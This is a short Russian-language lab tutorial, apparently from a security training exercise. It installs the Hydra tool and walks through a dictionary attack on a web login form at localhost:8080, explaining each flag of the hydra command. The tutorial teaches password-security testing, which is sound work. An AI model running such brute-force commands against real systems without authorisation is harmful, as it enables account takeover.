
```shell
sudo apt-get update 
sudo apt-get install hydra -y
```

Hydra - популярный инструмент, используемый профессионалами в области безопасности и этическими хакерами для тестирования безопасности паролей. Он может выполнять быстрые словарные атаки на различные сетевые сервисы. Он работает, принимая список имен пользователей и список паролей, а затем систематически пробует каждую комбинацию на целевой системе.

```shell
hydra -h
```



```shell
hydra -L ~/project/usernames.txt -P ~/project/500-worst-passwords.txt localhost -s 8080 http-post-form "/:username=^USER^&password=^PASS^:Invalid username or password" -o ~/project/hydra_results.txt
```

Разберем эту команду по частям:

- `hydra`: Имя инструмента, который мы используем.
- `-L ~/project/usernames.txt`: Использовать этот список имен пользователей.
- `-P ~/project/500-worst-passwords.txt`: Использовать этот список паролей.
- `localhost -s 8080`: Адрес веб-сайта, который мы тестируем.
- `"/:username=^USER^&password=^PASS^:Invalid username or password"`: Сообщает Hydra, как взаимодействовать с формой входа.
- `-o ~/project/hydra_results.txt`: Сохранить результаты в этот файл.

Hydra начнет работу, и вы увидите вывод, когда он будет пробовать каждую комбинацию имени пользователя и пароля. Этот процесс может занять несколько минут.

